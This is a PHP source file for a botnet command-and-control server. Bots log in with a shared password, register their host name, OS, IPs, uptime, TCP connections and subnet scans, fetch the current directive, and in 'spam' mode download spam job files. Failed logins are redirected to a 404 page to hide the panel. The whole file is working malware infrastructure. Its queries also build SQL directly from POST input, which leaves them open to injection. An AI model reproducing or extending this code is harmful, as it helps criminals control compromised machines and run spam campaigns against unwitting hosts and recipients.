<?php

	// Our db connection
	include_once("/var/includes/dbConnect.inc");

	// Our SQL log for degbugging
	// $mySQLlog = "logs/sql.log";
	// $fh = fopen($mySQLlog, 'a');

	// Functions shared by the various scripts
	include_once("./includes/functions.php");

	// The initial shared password
	$botInitialPwd = getDBParam("botInitialPwd");

	/*
	 * Sanitize and get parameters from POST. Note that not all variables are set 
	 * except for $botpwd which is required
	*/
	$botpwd   	= filter_var($_POST['botpwd'],FILTER_SANITIZE_MAGIC_QUOTES);
	$status   	= filter_var($_POST['status'],FILTER_SANITIZE_MAGIC_QUOTES);
	$botID 		= filter_var($_POST['botID'],FILTER_SANITIZE_MAGIC_QUOTES);
	$hostName 	= filter_var($_POST['hostName'],FILTER_SANITIZE_MAGIC_QUOTES);
	$osName 	= filter_var($_POST['osName'],FILTER_SANITIZE_MAGIC_QUOTES);
	$osVersion 	= filter_var($_POST['osVersion'],FILTER_SANITIZE_MAGIC_QUOTES);
	$osArch 	= filter_var($_POST['osArch'],FILTER_SANITIZE_MAGIC_QUOTES);
	$hostUptime 	= filter_var($_POST['hostUptime'],FILTER_SANITIZE_MAGIC_QUOTES);
	$hostIps 	= filter_var($_POST['hostIps'],FILTER_SANITIZE_MAGIC_QUOTES);
	$tcpConnections	= filter_var($_POST['tcpConnections'],FILTER_SANITIZE_MAGIC_QUOTES);
	$subnetScan	= filter_var($_POST['subnetScan'],FILTER_SANITIZE_MAGIC_QUOTES);
	$SMTPmode	= filter_var($_POST['SMTPmode'],FILTER_SANITIZE_MAGIC_QUOTES);

	/*
	 * Determine the source IP address of the bot (and whether or not it came from a proxy)
        */

	if (getenv("HTTP_X_FORWARDED_FOR")) {
        	$proxySourceIP = getenv("HTTP_X_FORWARDED_FOR");
    	} else {
		$proxySourceIP = null;
    	}
        $sourceIP = getenv("REMOTE_ADDR");

	/*	
	 * Authenticate the bot. If authentication fails, re-direct to page not found
	*/
	if ( $botpwd === $botInitialPwd ) {

		// The directive to send to the active bots
		$currentDirective = getDBParam("currentDirective");

		// The initial response to give to bots that are reporting for the first time
		$initialResponse = getDBParam("initialResponse");

		/*************************************
	 	 * bot in 'init' mode
		 *   Give it an initial response
		**************************************/
		if ( $status === "init" ) {
			echo $initialResponse;

		/*******************************************
	 	 * bot in 'start' mode
		 *   Send it its public IP
		 *   Register it
		********************************************/
		} else if ( $status === "start" ) {
			echo $sourceIP;
			$query="SELECT botID FROM bots WHERE botID='$botID'";
			fwrite($fh, $query."\n\r");
			$result=mysql_query($query);
			if ( mysql_numrows($result) < 1 ) {
				$query="INSERT INTO bots (botID,status,hostName,osName,osVersion,osArch,hostUptime,hostIps,sourceIP,proxySourceIP,Created,LastUpdated) ".
					"VALUES ('$botID','$status','$hostName','$osName','$osVersion','$osArch','$hostUptime','$hostIps','$sourceIP','$proxySourceIP',NOW(),NOW())";
				fwrite($fh, $query."\n\r");
				$result=mysql_query($query);
			}
		/**********************************************************
	 	 * bot in 'command' mode
		 *   Send it the current general directive
		 *   Update data with latest uptime, tcpConnections, etc.
		***********************************************************/
		} else if ( $status === "command" ) {
			$query="SELECT botID FROM bots WHERE botID='$botID'";
			fwrite($fh, $query."\r\n");
			$result=mysql_query($query);
			if ( mysql_numrows($result) < 1 ) {
				/*
				 * If for some reason the bot did not go through the 'init', 'start', 'command' states correctly, we
				 * send the intial response again
				 */
				echo "reset";
			} else {
				echo $currentDirective;
				$query="UPDATE bots set status='$status',hostUptime='$hostUptime',sourceIP='$sourceIP',proxySourceIP='$proxySourceIP',SMTPmode='$SMTPmode',LastUpdated=NOW(),".
					"tcpConnections='$tcpConnections' WHERE botID='$botID'";
				fwrite($fh, $query."\n\r");
				$result=mysql_query($query);
			}
		/************************************************
	 	 * bot in 'scan' mode
		 *   Save the scan report submitted by the bot
		*************************************************/
		} else if ( $subnetScan != NULL && $status === "scan" ) {
			echo $currentDirective;
			$query="UPDATE bots set status='$status',subnetScan='$subnetScan',LastUpdated=NOW() WHERE botID='$botID'";
			fwrite($fh, $query."\n\r");
			$result=mysql_query($query);
		/************************************
	 	 * bot in 'spam' mode
		 *   Send it parameter as XML data 
		*************************************/
		} else if ( $status === "spam" ) {
			$file = file_get_contents ("spamFactory/".$botID); 
			echo $file;
		} else {
			header("Location: /404.html");
		}
	} else if ( $botpwd != $botInitialPwd || $botID == null ) {
		header("Location: /404.html"); 
	} else {
		/*
		 * To code
		*/
	}

	// fclose($fh);

?>
